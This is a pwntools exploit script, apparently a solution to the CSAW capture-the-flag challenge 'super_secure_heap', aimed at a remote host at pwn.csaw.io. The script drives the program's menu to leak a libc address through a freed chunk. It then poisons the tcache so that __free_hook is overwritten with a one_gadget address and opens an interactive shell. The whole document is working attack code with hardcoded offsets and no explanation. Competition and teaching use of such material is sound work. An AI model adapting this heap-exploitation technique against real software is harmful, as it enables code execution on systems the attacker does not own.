from pwn import *
from Crypto.Cipher import ARC4

context.log_level = 'debug'
# use pwninit to get the patched binary
elf = context.binary = ELF('./super_secure_heap_patched')
libc = ELF('./libc.so.6')

key = b'A'*0x10
max_buf_size = 4095

if args.REMOTE:
    io = remote('pwn.csaw.io', 9998)
else:
    io = process(elf.path)
    gdb.attach(io, '''
set follow-fork-mode child
break execve
continue
''')

def add_key(size):
    io.sendlineafter(b'>\n', b'1') # work with keys
    io.sendlineafter(b'>\n', b'1') # add
    io.sendlineafter(b'item:\n', str(size).encode())

def add_content(size):
    io.sendlineafter(b'>\n', b'2') # work with content
    io.sendlineafter(b'>\n', b'1') # add
    io.sendlineafter(b'item:\n', str(size).encode())

def delete_key(idx):
    io.sendlineafter(b'>\n', b'1') # work with keys
    io.sendlineafter(b'>\n', b'2') # delete
    io.sendlineafter(b'remove:\n', str(idx).encode())

def delete_content(idx):
    io.sendlineafter(b'>\n', b'2') # work with content
    io.sendlineafter(b'>\n', b'2') # delete
    io.sendlineafter(b'remove:\n', str(idx).encode())

def set_key(idx, data, size):
    io.sendlineafter(b'>\n', b'1') # work with keys
    io.sendlineafter(b'>\n', b'3') # edit
    io.sendlineafter(b'you want to modify:\n', str(idx).encode())
    # has to be smaller than what is stored, but it's not respected anyway
    io.sendlineafter(b'size of the content:\n', str(size).encode())
    io.sendafter(b'Enter the content:\n', data)

def encrypt(pt):
    cipher = ARC4.new(key)
    return cipher.encrypt(pt)

def set_content(idx, keynum, data, size):
    io.sendlineafter(b'>\n', b'2') # work with content
    io.sendlineafter(b'>\n', b'3') # edit
    io.sendlineafter(b'you want to modify:\n', str(idx).encode())
    io.sendlineafter(b'store the content with:\n', str(keynum).encode())
    io.sendlineafter(b'size of the content:\n', str(size).encode())
    io.sendafter(b'Enter the content:\n', encrypt(data))

def show_key(idx):
    io.sendlineafter(b'>\n', b'1') # work with keys
    io.sendlineafter(b'>\n', b'4') # show
    io.sendlineafter(b'you want to show:\n', str(idx).encode())
    io.recvuntil(b'Here is your content: ')
    return io.recvuntil(b'Do you want to', drop=True)

def show_content(idx):
    io.sendlineafter(b'>\n', b'2') # work with content
    io.sendlineafter(b'>\n', b'4') # show
    io.sendlineafter(b'you want to show:\n', str(idx).encode())
    io.recvuntil(b'Here is your content: ')
    return io.recvuntil(b'Do you want to', drop=True)[1:]

def go_exit():
    io.sendlineafter(b'>\n', b'3') # exit

def leak_buf(i, size):
    buf = bytes()
    first = True
    while len(buf) < size:
        part = show_content(i)
        buf += part if first else b'\x00' + part[len(buf)+1:]
        first = False
        set_content(i, 0, b"A"*len(buf), len(buf))
    set_content(i, 0, buf, len(buf))
    return buf

add_key(0x10) # key idx 0
set_key(0, key, 0x0f)

add_content(max_buf_size)
delete_content(0)

add_content(0x80) #padding content 1
add_content(0x410) #padding content 2

add_key(0x410) #k1
add_key(0x410) #k2
add_key(0x410) #k3

delete_content(2)
delete_key(2)

libc_leak = u64(show_content(2) + b'\x00\x00')
print(hex(libc_leak))

elf.libc.address = libc_base = libc_leak - 0x1ecbe0
hook = libc_base + elf.libc.symbols["__free_hook"]
diff = (hook & 0xf)
hook -= diff

one_gadget = libc_base + 0xe3b01
print(hex(hook))

add_content(max_buf_size) # content 3
delete_content(3)

add_content(0x80) # content 4
add_content(0x80) # content 5
delete_content(4)
delete_content(5)

set_content(5, 0, p64(hook), 8)

add_content(0x80) # content 6
add_content(0x80) # content 7

set_content(7, 0, b'\x00' * diff + p64(one_gadget), 8 + diff)

delete_content(0)

io.interactive()
exit()
